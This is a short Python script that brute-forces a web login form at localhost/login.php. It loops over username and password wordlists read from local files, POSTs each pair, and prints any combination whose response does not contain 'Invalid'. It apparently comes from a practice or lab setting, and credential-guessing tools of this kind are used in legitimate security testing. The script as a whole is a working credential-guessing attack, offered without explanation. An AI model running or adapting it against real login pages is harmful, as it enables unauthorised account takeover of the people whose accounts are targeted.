#!/usr/bin/env python3
import requests

url = "http://localhost/login.php"

# for test without wordlist
# passwords = ["111111", "222222", "333333", "444444", "555555", "666666", "777777", "888888"]
with open('pass', 'r') as f:
    passwords = f.read().splitlines()

with open('usr', 'r') as f:
    users = f.read().splitlines()

def login_bruteforce(username):
    found = False
    for password in passwords:
        response = requests.post(url, data={"username": username, "password": password})
        if not "Invalid" in response.text:
            print(username,"\t:\t", password)
            found = True
            break
    if not found:
        print("not found") 

def finduser__bruteforce():
    for user in users:
        login_bruteforce(user)
    
# one test for find password
username = "ziv"
login_bruteforce(username)

# test for each username
finduser__bruteforce()